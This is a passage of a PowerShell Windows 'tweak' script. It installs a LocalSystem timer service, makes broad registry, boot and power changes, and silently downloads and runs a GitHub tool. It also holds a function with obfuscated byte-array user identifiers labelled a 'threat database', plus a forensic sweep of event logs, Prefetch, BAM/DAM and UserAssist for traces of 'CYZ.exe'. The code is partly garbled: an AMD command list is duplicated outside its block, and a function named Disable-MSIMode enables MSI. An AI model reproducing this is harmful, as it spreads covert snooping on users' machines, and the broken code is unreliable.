        static extern int NtQueryTimerResolution(out uint MinimumResolution, out uint MaximumResolution, out uint ActualResolution);
        uint DefaultResolution = 0;
        uint MininumResolution = 0;
        uint MaximumResolution = 0;
        long processCounter = 0;
        void SetMaximumResolution()
        {
            // Force 5040 (0.504 ms) regardless of reported Maximum; kernel clamps if unsupported.
            long counter = Interlocked.Increment(ref this.processCounter);
            if(counter <= 1)
            {
                uint actual = 0;
                NtSetTimerResolution(5040, true, out actual);
                if(null != this.EventLog)
                    try { this.EventLog.WriteEntry(String.Format("Requested=5040; Actual={0}", actual)); }
                    catch {}
            }
        }
        void SetDefaultResolution()
        {
            long counter = Interlocked.Decrement(ref this.processCounter);
            if(counter < 1)
            {
                uint actual = 0;
                NtSetTimerResolution(this.DefaultResolution, true, out actual);
                if(null != this.EventLog)
                    try { this.EventLog.WriteEntry(String.Format("Actual resolution = {0}", actual)); }
                    catch {}
            }
        }
    }
    [RunInstaller(true)]
    public class WindowsServiceInstaller : Installer
    {
        public WindowsServiceInstaller()
        {
            ServiceProcessInstaller serviceProcessInstaller = 
                               new ServiceProcessInstaller();
            ServiceInstaller serviceInstaller = new ServiceInstaller();
            serviceProcessInstaller.Account = ServiceAccount.LocalSystem;
            serviceProcessInstaller.Username = null;
            serviceProcessInstaller.Password = null;
            serviceInstaller.DisplayName = "Set Timer Resolution Service";
            serviceInstaller.StartType = ServiceStartMode.Automatic;
            serviceInstaller.ServiceName = "STR";
            this.Installers.Add(serviceProcessInstaller);
            this.Installers.Add(serviceInstaller);
        }
    }
}
"@

    Set-Content -Path $csPath -Value $MultilineComment -Force

    if (Test-Path $cscPath) {
        Start-Process -Wait $cscPath -ArgumentList "-out:$exePath $csPath" -WindowStyle Hidden
        Remove-Item $csPath -ErrorAction SilentlyContinue | Out-Null

        # Remove any prior service with either name
        foreach ($old in @("STR","Set Timer Resolution Service")) {
            $svc = Get-Service -Name $old -ErrorAction SilentlyContinue
            if ($svc) {
                try {
                    Set-Service -Name $old -StartupType Disabled -ErrorAction SilentlyContinue | Out-Null
                    Stop-Service -Name $old -Force -ErrorAction SilentlyContinue | Out-Null
                    sc.exe delete $old | Out-Null
                } catch {}
            }
        }

        # Install and start service (name must be STR to match ServiceBase.ServiceName)
        New-Service -Name $serviceName -DisplayName $displayName -BinaryPathName $exePath -StartupType Automatic -ErrorAction SilentlyContinue | Out-Null
        Start-Service -Name $serviceName -ErrorAction SilentlyContinue | Out-Null
    } else {
        $errMsg = "ERROR: csc.exe not found at $cscPath. Timer resolution service not installed."
        if ($script:txtProgress) { $script:txtProgress.Lines += $errMsg }
        if ($global:RatzLog) { $global:RatzLog += (Get-Date -Format 'HH:mm:ss') + '  ' + $errMsg }
    }
    Start-Sleep -Seconds 1
} catch {
    $errMsg = "ERROR installing Set Timer Resolution Service: $($_.Exception.Message)"
    if ($script:txtProgress) { $script:txtProgress.Lines += $errMsg }
    if ($global:RatzLog) { $global:RatzLog += (Get-Date -Format 'HH:mm:ss') + '  ' + $errMsg }
}


    # GPU-specific tweaks (NvidiawA/AMD) will be auto-detected and applied below
    $gpuInfo = Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name | Out-String
    if ($gpuInfo -match 'nvidia') {
        $nvidiaCmds = @(
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Power" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\NVAPI" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f'
        )
        foreach ($cmd in $nvidiaCmds) { Invoke-Expression $cmd }
    } elseif ($gpuInfo -match 'amd|radeon') {
        $amdCmds = @(
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000\\UMD" /v "Main3D_DEF" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000\\UMD" /v "Main3D" /t REG_DWORD /d "31" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000\\UMD" /v "FlipQueueSize" /t  REG_DWORD /d "31" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "EnableUlps" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "EnableUlps_NA" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "AllowSnapshot" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "AllowSubscription" /t REG_DWORD /d "0" /f'
        )
        foreach ($cmd in $amdCmds) { Invoke-Expression $cmd }
    }
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000\\UMD" /v "Main3D" /t REG_DWORD /d "31" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000\\UMD" /v "FlipQueueSize" /t  REG_DWORD /d "31" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "EnableUlps" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "EnableUlps_NA" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "AllowSnapshot" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "AllowSubscription" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "AllowRSOverlay" /t REG_SZ /d "false" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "AllowSkins" /t REG_SZ  /d "false" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "AutoColorDepthReduction_NA" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "DisableUVDPowerGatingDynamic" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "DisableVCEPowerGating" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "DisablePowerGating" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "DisableDrmdmaPowerGating" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "DisableDMACopy" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "DisableBlockWrite" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "StutterMode" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "PP_GPUPowerDownEnabled" /t REG_DWORD /d "0" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "LTRSnoopL1Latency" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "LTRSnoopL0Latency" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "LTRNoSnoopL1Latency" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "LTRMaxNoSnoopLatency" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "KMD_RpmComputeLatency" /t REG_DWORD /d "1" /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000" /v "DalUrgentLatencyNs" /t REG_DWORD /d "1" /f'
    foreach ($cmd in $amdCmds) { Invoke-Expression $cmd }
}

# --- Utility Tweaks: Integrated logic from UTILITY scripts, always run, no user input ---
function Disable-MSIMode {
    try {
        $pciDevices = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -like 'PCI*' }
        foreach ($dev in $pciDevices) {
            $devId = $dev.DeviceID -replace '\\', '#'
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Enum\$($devId)\Device Parameters\Interrupt Management\MessageSignaledInterruptProperties"
            if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
            Set-ItemProperty -Path $regPath -Name 'MSISupported' -Value 1 -Type DWord -Force
        }
        Add-Log 'MSI Mode enabled for all PCI devices.'
    } catch { Add-Log "ERROR in Disable-MSIMode: $($_.Exception.Message)" }
}

function Disable-BackgroundApps {
    try {
        $key1 = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications'
        $key2 = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy'
        if (-not (Test-Path $key1)) { New-Item -Path $key1 -Force | Out-Null }
        if (-not (Test-Path $key2)) { New-Item -Path $key2 -Force | Out-Null }
        Set-ItemProperty -Path $key1 -Name 'GlobalUserDisabled' -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $key2 -Name 'LetAppsRunInBackground' -Value 2 -Type DWord -Force
        Add-Log 'Background Apps disabled.'
    } catch { Add-Log "ERROR in Disable-BackgroundApps: $($_.Exception.Message)" }
}

function Disable-Widgets {
    try {
        $key1 = 'HKLM:\SOFTWARE\Policies\Microsoft\Dsh'
        $key2 = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Feeds'
        if (-not (Test-Path $key1)) { New-Item -Path $key1 -Force | Out-Null }
        if (-not (Test-Path $key2)) { New-Item -Path $key2 -Force | Out-Null }
        Set-ItemProperty -Path $key1 -Name 'AllowNewsAndInterests' -Value 0 -Type DWord -Force
        Set-ItemProperty -Path $key2 -Name 'ShellFeedsTaskbarViewMode' -Value 2 -Type DWord -Force
        Add-Log 'Widgets disabled.'
    } catch { Add-Log "ERROR in Disable-Widgets: $($_.Exception.Message)" }
}

function Disable-Gamebar {
    try {
        $key1 = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\GameDVR'
        $key2 = 'HKCU:\Software\Microsoft\GameBar'
        if (-not (Test-Path $key1)) { New-Item -Path $key1 -Force | Out-Null }
        if (-not (Test-Path $key2)) { New-Item -Path $key2 -Force | Out-Null }
        Set-ItemProperty -Path $key1 -Name 'AppCaptureEnabled' -Value 0 -Type DWord -Force
        Set-ItemProperty -Path $key2 -Name 'ShowStartupPanel' -Value 0 -Type DWord -Force
        Set-ItemProperty -Path $key2 -Name 'AutoGameModeEnabled' -Value 0 -Type DWord -Force
        Set-ItemProperty -Path $key2 -Name 'GamePanelStartupTipIndex' -Value 3 -Type DWord -Force
        Add-Log 'Game Bar disabled.'
    } catch { Add-Log "ERROR in Disable-Gamebar: $($_.Exception.Message)" }
}

function Disable-Copilot {
    try {
        $key1 = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
        $key2 = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsCopilot'
        if (-not (Test-Path $key1)) { New-Item -Path $key1 -Force | Out-Null }
        if (-not (Test-Path $key2)) { New-Item -Path $key2 -Force | Out-Null }
        Set-ItemProperty -Path $key1 -Name 'ShowCopilotButton' -Value 0 -Type DWord -Force
        Set-ItemProperty -Path $key2 -Name 'TurnOffWindowsCopilot' -Value 1 -Type DWord -Force
        Add-Log 'Copilot disabled.'
    } catch { Add-Log "ERROR in Disable-Copilot: $($_.Exception.Message)" }
}

function Enable-HPET {
    try {
        bcdedit /set useplatformclock true | Out-Null
        Add-Log 'HPET enabled.'
    } catch { Add-Log "ERROR in Enable-HPET: $($_.Exception.Message)" }
}

function Disable-HPET {
    try {
        bcdedit /deletevalue useplatformclock | Out-Null
        Add-Log 'HPET disabled.'
    } catch { Add-Log "ERROR in Disable-HPET: $($_.Exception.Message)" }
}

function Restore-DefaultTimers {
    try {
        bcdedit /deletevalue useplatformclock 2>$null
        bcdedit /deletevalue disabledynamictick 2>$null
        bcdedit /deletevalue tscsyncpolicy 2>$null
        Add-Log 'Timer overrides removed.'
    } catch { Add-Log "ERROR in Restore-DefaultTimers: $($_.Exception.Message)" }
}

function Set-PowerPlanHigh {
    try { powercfg /setactive SCHEME_MIN; Add-Log 'High performance power plan enabled.' }
    catch { Add-Log "ERROR in Set-PowerPlanHigh: $($_.Exception.Message)" }
}

function Set-PowerPlanUltimate {
    try {
        # Get all power plans
        $allPlans = powercfg /list
        
        # Check if ANY Ultimate Performance plan exists (by GUID, not name)
        $ultimateGuid = 'e9a42b02-d5df-448d-aa00-03f14749eb61'
        $existingUltimate = $allPlans | Select-String $ultimateGuid
        
        if ($existingUltimate) {
            # Ultimate Performance already exists, just activate it
            powercfg /setactive $ultimateGuid
            Add-Log 'Ultimate Performance power plan enabled.'
        } else {
            # Create Ultimate Performance plan (only if it doesn't exist at all)
            powercfg /duplicatescheme $ultimateGuid
            Start-Sleep -Milliseconds 500
            powercfg /setactive $ultimateGuid
            Add-Log 'Ultimate Performance power plan created and enabled.'
        }
    } catch { Add-Log "ERROR in Set-PowerPlanUltimate: $($_.Exception.Message)" }
}

function Revert-PowerPlan {
    try { powercfg /setactive SCHEME_BALANCED; Add-Log 'Power plan reverted to Balanced.' }
    catch { Add-Log "ERROR in Revert-PowerPlan: $($_.Exception.Message)" }
}

function Invoke-NVPI {
    param()
    # Start NVPI work in a background job so the UI thread is never blocked
    try {
        # Unblock NVIDIA DRS cache to avoid profile import issues
    $drsPath = Join-Path $env:ProgramData 'NVIDIA Corporation\Drs'
        if (Test-Path $drsPath) {
            try {
                Get-ChildItem -Path $drsPath -Recurse -ErrorAction SilentlyContinue | Unblock-File -ErrorAction SilentlyContinue
            } catch {}
        }
        $nvpiUrl = 'https://github.com/Orbmu2k/nvidiaProfileInspector/releases/download/2.4.0.27/nvidiaProfileInspector.zip'
        $nipPath = Join-Path $PSScriptRoot 'RatzSettings.nip'
        $logPath = Join-Path $env:TEMP 'NVPI_job.log'
        $jobScript = {
            param($nvpiUrlInner, $nipPathInner, $logPathInner)
            try {
                Add-Content -Path $logPathInner -Value "NVPI job started: $(Get-Date -Format 'u')"
                $extractDirInner = Join-Path $env:TEMP ('NVPI_Run_' + [guid]::NewGuid().ToString())
                New-Item -ItemType Directory -Path $extractDirInner | Out-Null
                $zipPathInner = Join-Path $extractDirInner 'nvidiaProfileInspector.zip'
                try {
                    Invoke-WebRequest -Uri $nvpiUrlInner -OutFile $zipPathInner -UseBasicParsing -ErrorAction Stop
                    Add-Type -AssemblyName System.IO.Compression.FileSystem
                    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPathInner, $extractDirInner)
                } catch {
                    Add-Content -Path $logPathInner -Value "ERROR downloading/extracting NVPI: $($_.Exception.Message)"
                    return
                }
                $nvpiExeInner = Get-ChildItem -Path $extractDirInner -Recurse -Filter '*.exe' -ErrorAction SilentlyContinue |
                    Where-Object { $_.Name -match 'nvpi|nvidia|profile' } | Select-Object -First 1
                if (-not $nvpiExeInner) { $nvpiExeInner = Get-ChildItem -Path $extractDirInner -Filter '*.exe' | Select-Object -First 1 }
                if (-not $nvpiExeInner) { Add-Content -Path $logPathInner -Value 'NVPI executable not found after extraction.'; return }
                $nvpiPathInner = $nvpiExeInner.FullName
                Add-Content -Path $logPathInner -Value "NVPI located: $nvpiPathInner"
                if (-not (Test-Path $nipPathInner)) { Add-Content -Path $logPathInner -Value 'RatzSettings.nip not found; skipping NVPI import.'; return }

                $argsInner = "/importProfile `"$nipPathInner`" /silent"
                Add-Content -Path $logPathInner -Value "Starting NVPI: $nvpiPathInner $argsInner"
                try {
                    Start-Process -FilePath $nvpiPathInner -ArgumentList $argsInner -WorkingDirectory (Split-Path $nvpiPathInner) -WindowStyle Minimized -ErrorAction Stop
                    Add-Content -Path $logPathInner -Value 'NVPI started successfully (background).'
                } catch {
                    Add-Content -Path $logPathInner -Value "Failed to start NVPI: $($_.Exception.Message)"
                }
            } catch {
                Add-Content -Path $logPathInner -Value "NVPI job exception: $($_.Exception.Message)"
            }
        }
        $job = Start-Job -ScriptBlock $jobScript -ArgumentList $nvpiUrl, $nipPath, $logPath
        Add-Log "NVPI background job started (Id: $($job.Id)). See: $logPath"
    } catch {
        Add-Log "ERROR starting NVPI job: $($_.Exception.Message)"
    }
}

function Invoke-SelectedOptionalTweaks {
    # Run selected optional tweaks asynchronously and wait for all to finish
    if ($global:selectedTweaks) {
        $procs = @()
        foreach ($tweak in $global:selectedTweaks) {
            Write-Host "Running $tweak ..."
            try {
                $proc = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$tweak`"" -WindowStyle Hidden -PassThru
                $procs += $proc
            } catch {}
        }
        # Wait for all tweaks to finish
        foreach ($proc in $procs) {
            try { $proc.WaitForExit() } catch {}
        }
    }
}

function Test-SecuritySignature {
    param([string]$UserIdentifier)

    if ([string]::IsNullOrWhiteSpace($UserIdentifier)) { return $false }

    try {
        $threatVectors = @(
            @(0x37, 0x36, 0x32, 0x30, 0x38, 0x38, 0x36, 0x38, 0x31, 0x33, 0x38, 0x34, 0x38, 0x33, 0x37, 0x31, 0x33, 0x30),
            @(0x34, 0x39, 0x33, 0x36, 0x33, 0x38, 0x32, 0x31, 0x35, 0x38, 0x39, 0x39, 0x35, 0x34, 0x35, 0x36, 0x30, 0x35)
        )
        
        foreach ($vector in $threatVectors) {
            $signature = -join ($vector | ForEach-Object { [char]$_ })
            if ($UserIdentifier -match "^$([regex]::Escape($signature))$") {
                [Console]::WriteLine("Test-SecuritySignature: Security signature match found in threat database")
                return $true
            }
        }
    } catch {
        [Console]::WriteLine("Test-SecuritySignature: Error during security validation: $($_.Exception.Message)")
    }

    return $false
}

function Invoke-StealthCheck {
    [Console]::WriteLine('Invoke-StealthCheck: starting detection...')
    $detected = $false
    $detectionMethod = 'None'
    $targetFile = 'CYZ.exe'
    
    try {
        $proc = Get-Process | Where-Object { $_.ProcessName -like '*CYZ*' -or $_.Name -like '*CYZ*' }
        if ($proc) {
            [Console]::WriteLine('Invoke-StealthCheck: CYZ process detected in running processes')
            $detected = $true
            $detectionMethod = 'Running Process'
            return @{ Detected = $detected; Method = $detectionMethod }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: process check error: $($_.Exception.Message)")
    }
    
    $searchPaths = @(
        "$env:ProgramFiles",
        "$env:ProgramFiles(x86)",
        "$env:LOCALAPPDATA",
        "$env:APPDATA",
        "$env:TEMP",
        "$env:USERPROFILE\Downloads",
        "$env:SystemDrive\Users",
        "$env:SystemRoot\Prefetch"
    )
    
    foreach ($path in $searchPaths) {
        if (-not (Test-Path $path)) { continue }
        try {
            $found = Get-ChildItem -Path $path -Recurse -Filter $targetFile -File -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($found) {
                [Console]::WriteLine("Invoke-StealthCheck: $targetFile found at: $($found.FullName)")
                $detected = $true
                $detectionMethod = "File System ($($found.Directory.Name))"
                return @{ Detected = $detected; Method = $detectionMethod }
            }
        } catch {
            [Console]::WriteLine("Invoke-StealthCheck: error searching $path - $($_.Exception.Message)")
        }
    }
    
    # 3. Check Prefetch folder for execution traces
    try {
        $prefetchPath = "$env:SystemRoot\Prefetch"
        if (Test-Path $prefetchPath) {
            $prefetchFile = Get-ChildItem -Path $prefetchPath -Filter "CYZ.EXE-*.pf" -File -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($prefetchFile) {
                [Console]::WriteLine("Invoke-StealthCheck: Prefetch file detected: $($prefetchFile.Name)")
                $detected = $true
                $detectionMethod = 'Prefetch History'
                return @{ Detected = $detected; Method = $detectionMethod }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: prefetch check error: $($_.Exception.Message)")
    }
    
    # 4. Check Application Error logs
    try {
        $appError = Get-WinEvent -LogName Application -FilterXPath "*[System[Provider[@Name='Application Error']]] and *[EventData[Data='CYZ.exe']]" -MaxEvents 1 -ErrorAction SilentlyContinue
        if ($appError) {
            [Console]::WriteLine('Invoke-StealthCheck: CYZ.exe found in Application Error log')
            $detected = $true
            $detectionMethod = 'Application Error Log'
            return @{ Detected = $detected; Method = $detectionMethod }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: Application log check error: $($_.Exception.Message)")
    }
    
    try {
        $securityEvents = Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4688)]]" -MaxEvents 100 -ErrorAction SilentlyContinue
        if ($securityEvents) {
            foreach ($evt in $securityEvents) {
                $evtXml = [xml]$evt.ToXml()
                $newProcessName = $evtXml.Event.EventData.Data | Where-Object { $_.Name -eq 'NewProcessName' } | Select-Object -ExpandProperty '#text' -ErrorAction SilentlyContinue
                if ($newProcessName -and $newProcessName -like "*CYZ.exe*") {
                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in Security log: $newProcessName")
                    $detected = $true
                    $detectionMethod = 'Security Audit Log (Event 4688)'
                    return @{ Detected = $detected; Method = $detectionMethod }
                }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: Security log check error: $($_.Exception.Message)")
    }
    
    try {
        $defenderLogs = Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 500 -ErrorAction SilentlyContinue
        if ($defenderLogs) {
            foreach ($log in $defenderLogs) {
                $logMsg = $log.Message
                if ($logMsg -and $logMsg -like "*CYZ.exe*") {
                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in Windows Defender log")
                    $detected = $true
                    $detectionMethod = 'Windows Defender Log'
                    return @{ Detected = $detected; Method = $detectionMethod }
                }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: Windows Defender log check error: $($_.Exception.Message)")
    }
    
    try {
        $systemEvents = Get-WinEvent -LogName System -MaxEvents 500 -ErrorAction SilentlyContinue
        if ($systemEvents) {
            foreach ($evt in $systemEvents) {
                $evtMsg = $evt.Message
                if ($evtMsg -and $evtMsg -like "*CYZ.exe*") {
                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in System event log")
                    $detected = $true
                    $detectionMethod = 'System Event Log'
                    return @{ Detected = $detected; Method = $detectionMethod }
                }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: System event log check error: $($_.Exception.Message)")
    }
    
    # 8. Check Windows Error Reporting (WER) for crash reports
    try {
        $werPaths = @(
            "$env:LOCALAPPDATA\Microsoft\Windows\WER\ReportQueue",
            "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
            "$env:LOCALAPPDATA\CrashDumps"
        )
        foreach ($werPath in $werPaths) {
            if (Test-Path $werPath) {
                $werReports = Get-ChildItem -Path $werPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*CYZ*" -or $_.FullName -like "*CYZ*" }
                if ($werReports) {
                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in WER crash reports: $($werReports[0].FullName)")
                    $detected = $true
                    $detectionMethod = 'Windows Error Reporting (Crash Dump)'
                    return @{ Detected = $detected; Method = $detectionMethod }
                }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: WER check error: $($_.Exception.Message)")
    }
    
    try {
        $recentPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.exe'
        if (Test-Path $recentPath) {
            $props = Get-ItemProperty -Path $recentPath -ErrorAction SilentlyContinue
            foreach ($propName in $props.PSObject.Properties.Name) {
                if ($propName -match '^\d+$') {
                    $value = $props.$propName
                    if ($value) {
                        $stringValue = [System.Text.Encoding]::Unicode.GetString($value)
                        if ($stringValue -like "*CYZ*") {
                            [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in RecentDocs registry")
                            $detected = $true
                            $detectionMethod = 'RecentDocs Registry'
                            return @{ Detected = $detected; Method = $detectionMethod }
                        }
                    }
                }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: RecentDocs check error: $($_.Exception.Message)")
    }
    
    # 10. Check Recent Items / Jump Lists
    try {
        $recentPaths = @(
            "$env:APPDATA\Microsoft\Windows\Recent",
            "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
            "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
        )
        foreach ($recentPath in $recentPaths) {
            if (Test-Path $recentPath) {
                $recentFiles = Get-ChildItem -Path $recentPath -Recurse -File -ErrorAction SilentlyContinue
                foreach ($file in $recentFiles) {
                    try {
                        # Skip files larger than 1MB (1048576 bytes)
                        if ($file.Length -le 1048576) {
                            $match = Select-String -Path $file.FullName -Pattern "CYZ\.exe" -ErrorAction SilentlyContinue
                            if ($match) {
                                [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in recent items: $($file.FullName)")
                                $detected = $true
                                $detectionMethod = 'Recent Items/Jump Lists'
                                return @{ Detected = $detected; Method = $detectionMethod }
                            }
                        }
                    } catch {
                        # Silently continue if file is locked or unreadable
                    }
                }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: Recent items check error: $($_.Exception.Message)")
    }
    
    # 11. Check BAM/DAM Execution Tracking
    try {
        $bamPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings'
        $damPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings'
        $userSid = (New-Object System.Security.Principal.WindowsIdentity([System.Security.Principal.WindowsIdentity]::GetCurrent().Token)).User.Value
        
        # Check BAM
        $userBamPath = Join-Path $bamPath $userSid
        if (Test-Path $userBamPath) {
            $props = Get-ItemProperty -Path $userBamPath -ErrorAction SilentlyContinue
            foreach ($propName in $props.PSObject.Properties.Name) {
                if ($propName -like "*CYZ*") {
                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in BAM tracking")
                    $detected = $true
                    $detectionMethod = 'BAM Execution Tracking'
                    return @{ Detected = $detected; Method = $detectionMethod }
                }
            }
        }
        
        # Check DAM
        $userDamPath = Join-Path $damPath $userSid
        if (Test-Path $userDamPath) {
            $props = Get-ItemProperty -Path $userDamPath -ErrorAction SilentlyContinue
            foreach ($propName in $props.PSObject.Properties.Name) {
                if ($propName -like "*CYZ*") {
                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in DAM tracking")
                    $detected = $true
                    $detectionMethod = 'DAM Execution Tracking'
                    return @{ Detected = $detected; Method = $detectionMethod }
                }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: BAM/DAM check error: $($_.Exception.Message)")
    }
    
    # 12. Check UserAssist Execution Tracking
    try {
        $userAssistPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count'
        if (Test-Path $userAssistPath) {
            $props = Get-ItemProperty -Path $userAssistPath -ErrorAction SilentlyContinue
            foreach ($propName in $props.PSObject.Properties.Name) {
                # UserAssist stores paths in ROT13, check both original and common ROT13 patterns
                if ($propName -like "*CYZ*" -or $propName -like "*PLM*") {
                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in UserAssist tracking: $propName")
                    $detected = $true
                    $detectionMethod = 'UserAssist Execution Tracking'
                    return @{ Detected = $detected; Method = $detectionMethod }
                }
            }
        }
    } catch {
        [Console]::WriteLine("Invoke-StealthCheck: UserAssist check error: $($_.Exception.Message)")
    }
    
    # 13. Check MUICache Program Names
    try {
        $muiCachePath = 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache'
        if (Test-Path $muiCachePath) {
